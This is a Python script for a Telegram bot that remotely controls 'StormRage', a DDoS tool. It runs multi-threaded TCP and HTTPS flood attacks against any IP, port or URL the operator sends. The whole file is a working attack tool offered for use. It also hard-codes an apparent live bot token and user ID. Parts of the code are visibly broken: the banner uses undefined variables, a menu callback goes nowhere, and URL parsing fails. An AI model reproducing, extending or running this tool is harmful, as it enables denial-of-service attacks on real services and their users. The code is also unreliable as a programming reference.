#!/usr/bin/env python3
"""
Telegram Bot Controller for StormRage DDoS Tool
Original script by Alok Thakur (Firewall Breaker)
Enhanced with Telegram bot control
"""

import socket
import threading
import requests
import random
import time
import os
import sys
import logging
from datetime import datetime

# Telegram Bot Libraries
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
    TELEGRAM_AVAILABLE = True
except ImportError:
    print("[!] Install telegram: pip install python-telegram-bot")
    TELEGRAM_AVAILABLE = False
    sys.exit(1)

# ==================== CONFIGURATION ====================
# REPLACE WITH YOUR BOT TOKEN FROM @BotFather
BOT_TOKEN = "8957381735:AAEbDCbmmzvT1aDUBdUOjDAHZdbi5OQpxxQ"

# REPLACE WITH YOUR TELEGRAM USER ID (get from @userinfobot)
AUTHORIZED_USERS = [7898928200]  # Add your Telegram user IDs here

# Attack tracking
active_attacks = {}
attack_counter = 0
attack_lock = threading.Lock()

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== COLORS ====================
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
WHITE = '\033[0m'

# ==================== ORIGINAL ATTACK FUNCTIONS (UNCHANGED) ====================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def tcp_flood(ip, port, attack_id):
    """TCP flood function with attack tracking"""
    while active_attacks.get(attack_id, {}).get('running', False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            data = random._urandom(1024)
            sock.send(data)
            sock.close()
            print(f"{GREEN}[TCP] Packet sent to {ip}:{port}{WHITE}")
        except:
            print(f"{RED}[TCP] Failed to send packet to {ip}:{port}{WHITE}")

def https_flood(url, attack_id):
    """HTTPS flood function with attack tracking"""
    headers_list = [
        {'User-Agent': 'Mozilla/5.0'},
        {'User-Agent': 'Chrome/91.0'},
        {'User-Agent': 'Safari/537.36'},
        {'User-Agent': 'Opera/9.80'},
        {'User-Agent': 'Firefox/89.0'},
        {'User-Agent': 'Edge/91.0'},
    ]
    
    while active_attacks.get(attack_id, {}).get('running', False):
        try:
            headers = random.choice(headers_list)
            response = requests.get(url, headers=headers, timeout=5)
            print(f"{GREEN}[HTTPS] Request sent to {url} | Status: {response.status_code}{WHITE}")
        except:
            print(f"{RED}[HTTPS] Failed to send request to {url}{WHITE}")

# ==================== TELEGRAM BOT COMMANDS ====================

def is_authorized(user_id):
    """Check if user is authorized to use the bot"""
    return user_id in AUTHORIZED_USERS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a welcome message when /start is issued."""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Unauthorized access. You are not allowed to use this bot.")
        return
    
    keyboard = [
        [InlineKeyboardButton("🔥 TCP Attack", callback_data='tcp'),
         InlineKeyboardButton("🌐 HTTPS Attack", callback_data='https')],
        [InlineKeyboardButton("📊 Active Attacks", callback_data='status'),
         InlineKeyboardButton("🛑 Stop All", callback_data='stop_all')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"💀 *StormRage DDoS Bot Activated* 💀\n\n"
        f"👤 User: {update.effective_user.first_name}\n"
        f"⚡ Status: READY\n"
        f"🔧 Mode: Full Power\n\n"
        f"Use the buttons below to control the bot:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await query.edit_message_text("❌ Unauthorized access.")
        return
    
    if query.data == 'tcp':
        context.user_data['attack_type'] = 'tcp'
        await query.edit_message_text(
            "🔥 *TCP Attack Setup*\n\n"
            "Send target details in this format:\n"
            "`IP:PORT:THREADS`\n\n"
            "Example: `192.168.1.1:80:500`\n\n"
            "Or send:\n"
            "`IP PORT THREADS`\n\n"
            "Reply with your target details.",
            parse_mode='Markdown'
        )
    
    elif query.data == 'https':
        context.user_data['attack_type'] = 'https'
        await query.edit_message_text(
            "🌐 *HTTPS Attack Setup*\n\n"
            "Send target details in this format:\n"
            "`URL:THREADS`\n\n"
            "Example: `https://example.com:1000`\n\n"
            "Reply with your target URL and threads.",
            parse_mode='Markdown'
        )
    
    elif query.data == 'status':
        await show_status(update, context)
    
    elif query.data == 'stop_all':
        await stop_all_attacks(update, context)
    
    elif query.data == 'help':
        await show_help(update, context)

async def show_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show active attacks"""
    global active_attacks
    
    if not active_attacks:
        status_text = "📊 *No active attacks running*"
    else:
        status_text = "📊 *Active Attacks:*\n\n"
        for aid, info in active_attacks.items():
            if info.get('running', False):
                status_text += f"🔹 Attack #{aid}: {info.get('type', 'unknown')} → {info.get('target', 'unknown')}\n"
                status_text += f"   Threads: {info.get('threads', 0)} | Started: {info.get('start_time', 'unknown')}\n\n"
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(status_text, parse_mode='Markdown', reply_markup=reply_markup)
    else:
        await update.message.reply_text(status_text, parse_mode='Markdown', reply_markup=reply_markup)

async def stop_all_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop all running attacks"""
    global active_attacks
    
    stopped = 0
    for aid in list(active_attacks.keys()):
        if active_attacks[aid].get('running', False):
            active_attacks[aid]['running'] = False
            stopped += 1
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        f"🛑 *Stopped {stopped} attack(s)*\n\nAll attacks have been terminated.",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message"""
    help_text = """
*StormRage DDoS Bot - Help*

*Commands:*
/start - Show main menu
/status - Show active attacks
/stop - Stop all attacks
/help - Show this help

*Attack Formats:*

🌐 *HTTPS Attack:*
`URL:THREADS`
Example: `https://example.com:1000`

🔥 *TCP Attack:*
`IP:PORT:THREADS`
Example: `192.168.1.1:80:500`

*Notes:*
- Attacks run in background threads
- Use /stop to terminate all attacks
- High thread counts may affect performance
"""
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(help_text, parse_mode='Markdown', reply_markup=reply_markup)
    else:
        await update.message.reply_text(help_text, parse_mode='Markdown', reply_markup=reply_markup)

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Return to main menu"""
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🔥 TCP Attack", callback_data='tcp'),
         InlineKeyboardButton("🌐 HTTPS Attack", callback_data='https')],
        [InlineKeyboardButton("📊 Active Attacks", callback_data='status'),
         InlineKeyboardButton("🛑 Stop All", callback_data='stop_all')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "💀 *StormRage DDoS Bot* 💀\n\nSelect an option below:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user messages for attack parameters"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    text = update.message.text.strip()
    attack_type = context.user_data.get('attack_type')
    
    if attack_type == 'tcp':
        await start_tcp_attack(update, context, text)
    elif attack_type == 'https':
        await start_https_attack(update, context, text)
    else:
        await update.message.reply_text(
            "❌ Unknown command.\n\n"
            "Use /start to see the menu or send attack details directly:\n"
            "• IP:PORT:THREADS (TCP)\n"
            "• URL:THREADS (HTTPS)"
        )

async def start_tcp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Start TCP attack from message"""
    global attack_counter, active_attacks
    
    try:
        # Parse format: IP:PORT:THREADS or IP PORT THREADS
        if ':' in text:
            parts = text.split(':')
            ip = parts[0].strip()
            port = int(parts[1].strip())
            threads = int(parts[2].strip())
        else:
            parts = text.split()
            ip = parts[0].strip()
            port = int(parts[1].strip())
            threads = int(parts[2].strip())
        
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            active_attacks[attack_id] = {
                'type': 'TCP',
                'target': f"{ip}:{port}",
                'threads': threads,
                'running': True,
                'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        
        # Start attack threads
        for _ in range(threads):
            thread = threading.Thread(target=tcp_flood, args=(ip, port, attack_id))
            thread.daemon = True
            thread.start()
        
        await update.message.reply_text(
            f"✅ *TCP Attack Started!*\n\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"🔧 Threads: {threads}\n"
            f"🆔 Attack ID: {attack_id}\n\n"
            f"Use `/stop` to terminate this attack.",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting TCP attack: {str(e)}\n\nFormat: `IP:PORT:THREADS`", parse_mode='Markdown')

async def start_https_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Start HTTPS attack from message"""
    global attack_counter, active_attacks
    
    try:
        # Parse format: URL:THREADS
        if ':' in text:
            parts = text.split(':')
            url = parts[0].strip()
            threads = int(parts[1].strip())
        else:
            parts = text.split()
            url = parts[0].strip()
            threads = int(parts[1].strip())
        
        if not url.startswith('http'):
            url = 'https://' + url
        
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            active_attacks[attack_id] = {
                'type': 'HTTPS',
                'target': url,
                'threads': threads,
                'running': True,
                'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        
        # Start attack threads
        for _ in range(threads):
            thread = threading.Thread(target=https_flood, args=(url, attack_id))
            thread.daemon = True
            thread.start()
        
        await update.message.reply_text(
            f"✅ *HTTPS Attack Started!*\n\n"
            f"🎯 Target: `{url}`\n"
            f"🔧 Threads: {threads}\n"
            f"🆔 Attack ID: {attack_id}\n\n"
            f"Use `/stop` to terminate this attack.",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting HTTPS attack: {str(e)}\n\nFormat: `URL:THREADS`", parse_mode='Markdown')

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop all attacks via command"""
    global active_attacks
    
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    stopped = 0
    for aid in list(active_attacks.keys()):
        if active_attacks[aid].get('running', False):
            active_attacks[aid]['running'] = False
            stopped += 1
    
    await update.message.reply_text(f"🛑 Stopped {stopped} active attack(s).")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show status via command"""
    await show_status(update, context)

# ==================== MAIN FUNCTION ====================

def main():
    """Start the bot"""
    if not TELEGRAM_AVAILABLE:
        print("[!] python-telegram-bot not installed. Run: pip install python-telegram-bot")
        return
    
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[!] Please set your BOT_TOKEN in the script!")
        print("[!] Get a token from @BotFather on Telegram")
        print("\n[!] Also add your Telegram user ID to AUTHORIZED_USERS")
        print("[!] Get your ID from @userinfobot")
        return
    
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════╗{WHITE}
{RED}║{Y}     StormRage DDoS Bot - Telegram Controller Active     {RED}║{WHITE}
{RED}║{G}     Original Script by: Alok Thakur (Firewall Breaker)   {RED}║{WHITE}
{RED}║{C}     Enhanced with Telegram Bot Control                   {RED}║{WHITE}
{RED}╚═══════════════════════════════════════════════════════════╝{WHITE}
    """)
    print(f"{GREEN}[+] Bot starting...{WHITE}")
    print(f"{GREEN}[+] Bot Token: {BOT_TOKEN[:10]}...{WHITE}")
    print(f"{GREEN}[+] Authorized Users: {AUTHORIZED_USERS}{WHITE}")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", show_help))
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^(tcp|https|status|stop_all|help|menu)$'))
    application.add_handler(CallbackQueryHandler(back_to_menu, pattern='^menu$'))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print(f"{GREEN}[+] Bot is running! Send /start on Telegram{WHITE}")
    print(f"{YELLOW}[!] Press Ctrl+C to stop the bot{WHITE}")
    
    # Start the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Bot stopped{WHITE}")
        sys.exit(0)